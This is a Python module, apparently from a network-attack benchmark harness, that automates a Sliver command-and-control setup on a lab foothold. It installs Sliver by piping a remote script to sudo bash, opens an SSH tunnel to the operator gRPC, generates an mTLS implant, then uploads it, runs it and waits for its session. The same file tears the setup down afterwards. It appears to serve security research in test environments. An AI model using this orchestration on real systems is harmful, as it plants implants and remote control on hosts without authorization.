"""Sliver C2 lifecycle — the Sliver analog of incalmo/c2.py. Stands a Sliver server up ON THE FOOTHOLD
(installed self-contained at setup), opens an ssh -L tunnel so the harness reaches the operator gRPC,
starts an mTLS listener, generates + lands a session-mode implant, and waits for its session. Teardown
is keyed by experiment_name (statefile), like c2.py — no persisted C2 handle.

Split by trust/venv:
  * This module runs in the MANAGER process (harness venv). It does the SSH/subprocess work (install,
    daemon, tunnel, deliver+run the implant) and reads/writes state. It holds NO sliver-py import.
  * All sliver-py (operator gRPC client) work lives in _sliver_ops.py, run under the dedicated sliver
    venv (cfg.get_sliver_python()), because the manager venv has no sliver-py. setup_c2 shells out to it.

Reaches the foothold ONLY through the env-provided SetupAccess (scoped key + bastion routing) — no
management key off disk, same contract as c2.py / foothold.py.

NOT LIVE-VALIDATED. The SSH/orchestration shape here is solid, but the exact sliver-server CLI flags,
the sliver-py calls in _sliver_ops.py, and mTLS-over-the-tunnel all need a pass against an installed
Sliver before this is trusted. Points that need it are marked `VALIDATE:`.
"""
from __future__ import annotations

import asyncio
import json
import os
import shlex
import signal
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from ...env_spec import SetupAccess
from ..base import PreparedAttacker

_STATE_DIR = Path("/tmp/mhbench-sliver-c2")
_GRPC_PORT = 31337   # sliver operator gRPC (on the foothold); reached from the harness via the tunnel
_LISTENER_PORT = 8443  # mTLS C2 listener on the foothold; victims session in here (VALIDATE: env firewall)
_SLIVER_INSTALL = "https://sliver.sh/install"  # official installer; setup runs it on the foothold


@dataclass
class SliverPreparedC2(PreparedAttacker):
    """Sliver setup() output, carried on the opaque baton for the plugin's OWN build_config()/run().
    The arena never inspects it."""
    operator_cfg: Optional[str] = None   # harness-side path to the operator config (rewritten to the tunnel)
    listener_addr: Optional[str] = None  # the foothold's in-env listener address victims session to
    control_port: Optional[int] = None   # local tunnel port the operator gRPC is reachable on (127.0.0.1:<port>)


def _statefile(experiment_name: str) -> Path:
    return _STATE_DIR / f"{experiment_name}.json"


def _ssh(access: SetupAccess) -> list[str]:
    """ssh argv to the foothold over the env-provided SetupAccess (scoped key + bastion routing).
    Mirrors c2.py's _ssh_to_foothold — routing is opaque in access.ssh_common_args."""
    args = ["ssh"]
    if access.ssh_key:
        args += ["-i", os.path.expanduser(access.ssh_key)]
    args += ["-p", str(access.port), "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR", "-o", "ConnectTimeout=15",
             "-o", "ServerAliveInterval=30", "-o", "ServerAliveCountMax=3"]
    if access.ssh_common_args:
        args += shlex.split(access.ssh_common_args)
    args += [f"{access.user}@{access.host}"]
    return args


async def _ssh_run(access: SetupAccess, remote_cmd: str, timeout: int = 600) -> tuple[int, str]:
    proc = await asyncio.create_subprocess_exec(
        *_ssh(access), remote_cmd,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
    try:
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return 124, "timeout"
    return proc.returncode, out.decode("utf-8", "replace")


def _free_local_port() -> int:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]
    finally:
        s.close()


def _wait_for_port(host: str, port: int, timeout: int = 60) -> bool:
    """Poll a TCP connect until the port accepts (the ssh -L local end is bound) or timeout. The tunnel
    supervisor's ssh takes a few seconds to connect through the bastion + bind the local port; dialing
    the operator gRPC before that = 'Connection refused' at 127.0.0.1:<port> (observed live, run 6)."""
    import socket
    import time as _t
    deadline = _t.time() + timeout
    while _t.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=3):
                return True
        except OSError:
            _t.sleep(1)
    return False


async def _run_sliver_ops(cfg, subcmd: str, args: list[str], timeout: int = 300) -> tuple[int, str]:
    """Run _sliver_ops.py under the dedicated sliver venv (it has sliver-py; the manager venv does not).
    Returns (returncode, stdout)."""
    helper = Path(__file__).parent / "_sliver_ops.py"
    proc = await asyncio.create_subprocess_exec(
        str(cfg.get_sliver_python()), str(helper), subcmd, *args,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
    try:
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return 124, "timeout"
    return proc.returncode, out.decode("utf-8", "replace")


async def setup_c2(experiment_name: str, cfg, access: SetupAccess, mgmt_ip: Optional[str] = None) -> SliverPreparedC2:
    """Bring the Sliver C2 up on the foothold and return once the initial session is in. Raises on
    failure (the plugin tears down a partial C2 via teardown_c2)."""
    if access is None or not access.host:
        raise RuntimeError(f"[sliver-c2] need a foothold SetupAccess with a host (got {access!r})")
    _STATE_DIR.mkdir(parents=True, exist_ok=True)
    foothold = access.host
    work = _STATE_DIR / experiment_name
    work.mkdir(parents=True, exist_ok=True)

    # 1. Install sliver-server on the foothold (self-contained; idempotent). The official installer
    #    apt-installs build-essential + minisign (Sliver needs build-essential for implant compilation),
    #    so `apt-get update` MUST run first: the baked Kali image ships stale/empty apt lists, which is
    #    the only reason the first live run failed ("Unable to locate package minisign / build-essential
    #    has no installation candidate"). Egress + update + the deps all resolve after an update
    #    (verified live on the foothold). The "configured multiple times" warnings from the image's
    #    duplicate sources are cosmetic. DEBIAN_FRONTEND=noninteractive avoids prompts during the install.
    rc, out = await _ssh_run(access,
        "command -v sliver-server >/dev/null || ("
        "export DEBIAN_FRONTEND=noninteractive && apt-get update -qq && curl -fsSL %s | sudo bash)"
        % shlex.quote(_SLIVER_INSTALL),
        timeout=1200)
    if rc != 0:
        raise RuntimeError(f"[sliver-c2] sliver-server install on foothold failed (rc={rc}): {out[-500:]}")

    # 2. Start the sliver-server daemon (operator gRPC up on :31337). The installer may already start it;
    #    pgrep-guard so we don't double-run. Use the ABSOLUTE binary path: the installer drops the binary
    #    at /root/sliver-server and does NOT put it on PATH (confirmed live).
    await _ssh_run(access,
        'SS="$(command -v sliver-server 2>/dev/null || echo /root/sliver-server)"; '
        "pgrep -f 'sliver-server daemon' >/dev/null || "
        '(setsid "$SS" daemon >/var/log/sliver-server.log 2>&1 < /dev/null &)', timeout=120)

    # 3. Generate an operator config on the foothold and pull it back. Two things confirmed live and both
    #    required: the absolute binary path (not on PATH), and `--permissions all` (without it sliver-server
    #    errors "Must specify --permissions" and writes nothing). --lhost 127.0.0.1 is cosmetic here — step 4
    #    overwrites lhost/lport to point the client at the tunnel. Capture the operator stderr so a future
    #    failure shows the real cause, not just the missing-file cat.
    rc0, out0 = await _ssh_run(access,
        'SS="$(command -v sliver-server 2>/dev/null || echo /root/sliver-server)"; '
        '"$SS" operator --name op --lhost 127.0.0.1 --permissions all --save /tmp/op.cfg',
        timeout=120)
    rc, cfg_text = await _ssh_run(access, "cat /tmp/op.cfg", timeout=60)
    # The SSH transport merges stderr into stdout, so "Permanently added ... to known hosts" warnings
    # (UserKnownHostsFile=/dev/null over the bastion hop) can PREPEND the config in cfg_text — cat itself
    # succeeds and the config is intact at the tail. Extract the JSON from the first brace (the config is
    # one {...} object; the warnings contain no braces) so residual SSH noise can't break parsing.
    # (LogLevel=ERROR on _ssh suppresses most of it; this is the reliable belt.)
    brace = cfg_text.find("{")
    if rc != 0 or brace < 0:
        raise RuntimeError(f"[sliver-c2] could not read operator config (operator rc={rc0}): "
                           f"{out0[-300:]} | cat tail: {cfg_text[-200:]}")
    try:
        cfg_json = json.loads(cfg_text[brace:])
    except ValueError as e:
        raise RuntimeError(f"[sliver-c2] operator config from foothold is not valid JSON ({e}): {cfg_text[brace:][:200]}")
    operator_cfg = work / "operator.cfg"

    # 4. Open the harness->foothold tunnel for the operator gRPC (foothold has no FIP). Rewrite the
    #    operator config's port to the local tunnel port so the client connects through it.
    #    VALIDATE: mTLS — the server cert is issued for the foothold; connecting to 127.0.0.1:<lport>
    #    must still validate (CA-based). If sliver-py enforces hostname, the config/cert needs a SAN or
    #    an InsecureSkipVerify-equivalent; this is the single riskiest point of the integration.
    local_port = _free_local_port()
    cfg_json["lport"] = local_port
    cfg_json["lhost"] = "127.0.0.1"
    operator_cfg.write_text(json.dumps(cfg_json))
    tunnel_log = work / "tunnel.log"
    tunnel = _open_tunnel(access, local_port, _GRPC_PORT, tunnel_log)

    try:
        # 4b. Wait for the ssh -L local port to come up before dialing the operator gRPC through it. The
        #     supervisor's ssh needs a few seconds to connect through the bastion + bind the port, so
        #     dialing immediately = "Connection refused" at 127.0.0.1:<port> (observed live, run 6).
        loop = asyncio.get_event_loop()
        if not await loop.run_in_executor(None, _wait_for_port, "127.0.0.1", local_port, 60):
            tail = tunnel_log.read_text()[-500:] if tunnel_log.exists() else "(no tunnel log)"
            raise RuntimeError(f"[sliver-c2] operator-gRPC tunnel 127.0.0.1:{local_port} never came up; tunnel log: {tail}")

        # 5. Via sliver-py (the helper, under the sliver venv): start the mTLS listener on the foothold
        #    and generate a session-mode implant, saved locally. VALIDATE: _sliver_ops.provision.
        implant = work / "implant"
        rc, out = await _run_sliver_ops(cfg, "provision", [
            "--cfg", str(operator_cfg), "--listener-host", foothold,
            "--listener-port", str(_LISTENER_PORT), "--out", str(implant)], timeout=600)
        if rc != 0:
            raise RuntimeError(f"[sliver-c2] implant/listener provision failed (rc={rc}): {out[-600:]}")

        # 6. Ship + run the implant on the foothold (initial session). VALIDATE: exec/backgrounding.
        with open(implant, "rb") as f:
            put = await asyncio.create_subprocess_exec(
                *_ssh(access), "cat > /tmp/implant && chmod +x /tmp/implant",
                stdin=f, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.PIPE)
            await put.communicate()
        await _ssh_run(access, "setsid /tmp/implant >/dev/null 2>&1 < /dev/null &", timeout=60)

        # 7. Wait for the initial session to register. VALIDATE: _sliver_ops.wait.
        rc, out = await _run_sliver_ops(cfg, "wait", ["--cfg", str(operator_cfg), "--timeout", "180"], timeout=240)
        if rc != 0:
            raise RuntimeError(f"[sliver-c2] no Sliver session beaconed in: {out[-400:]}")
    except Exception:
        _kill_pid(tunnel.pid)
        raise

    _statefile(experiment_name).write_text(json.dumps({
        "tunnel_pid": tunnel.pid, "foothold": foothold, "local_port": local_port,
        "access": access.model_dump(),  # teardown reaches the foothold with the same scoped reach
    }))
    listener_addr = f"{foothold}:{_LISTENER_PORT}"
    return SliverPreparedC2(operator_cfg=str(operator_cfg), listener_addr=listener_addr, control_port=local_port)


def _open_tunnel(access: SetupAccess, local_port: int, remote_port: int, log_path: Path) -> subprocess.Popen:
    """Resilient ssh -L 127.0.0.1:<local_port> -> 127.0.0.1:<remote_port> on the foothold, through the
    bastion. Supervised auto-reconnect, same shape as c2.py's tunnel. The supervisor's stdout/stderr go
    to log_path (NOT /dev/null) so a failing/looping ssh -L is diagnosable (ExitOnForwardFailure, a
    rejected forward, a bad jump, etc.) — the caller reads its tail if the local port never comes up."""
    ssh_tunnel = ["ssh", "-N", "-o", "ExitOnForwardFailure=yes", "-o", "ServerAliveInterval=30",
                  "-o", "ServerAliveCountMax=6", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                  "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "-p", str(access.port)]
    if access.ssh_key:
        ssh_tunnel += ["-i", os.path.expanduser(access.ssh_key)]
    if access.ssh_common_args:
        ssh_tunnel += shlex.split(access.ssh_common_args)
    ssh_tunnel += ["-L", f"127.0.0.1:{local_port}:127.0.0.1:{remote_port}", f"{access.user}@{access.host}"]
    supervisor = "while true; do " + " ".join(shlex.quote(a) for a in ssh_tunnel) + "; sleep 2; done"
    log_f = open(log_path, "a")
    log_f.write("=== tunnel supervisor: " + " ".join(shlex.quote(a) for a in ssh_tunnel) + " ===\n")
    log_f.flush()
    return subprocess.Popen(["bash", "-c", supervisor], stdout=log_f,
                            stderr=subprocess.STDOUT, start_new_session=True)


def _kill_pid(pid: int) -> None:
    for sig in (signal.SIGTERM, signal.SIGKILL):
        try:
            os.killpg(os.getpgid(pid), sig)
        except ProcessLookupError:
            return
        except Exception:
            try:
                os.kill(pid, sig)
            except Exception:
                return


def teardown_c2(experiment_name: str, cfg=None) -> None:
    """Kill the tunnel + stop the Sliver server/implant on the foothold. Keyed by experiment_name.
    Never raises. Sync (called via run_in_executor from the async stop path)."""
    sf = _statefile(experiment_name)
    try:
        state = json.loads(sf.read_text())
    except Exception:
        return
    pid = state.get("tunnel_pid")
    if isinstance(pid, int):
        _kill_pid(pid)
    acc = state.get("access")
    if acc:
        try:
            access = SetupAccess.model_validate(acc)
            subprocess.run(_ssh(access) + [
                "pkill -f 'sliver-server daemon'; pkill -f /tmp/implant; rm -f /tmp/implant /tmp/op.cfg || true"],
                timeout=120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    try:
        sf.unlink()
    except Exception:
        pass
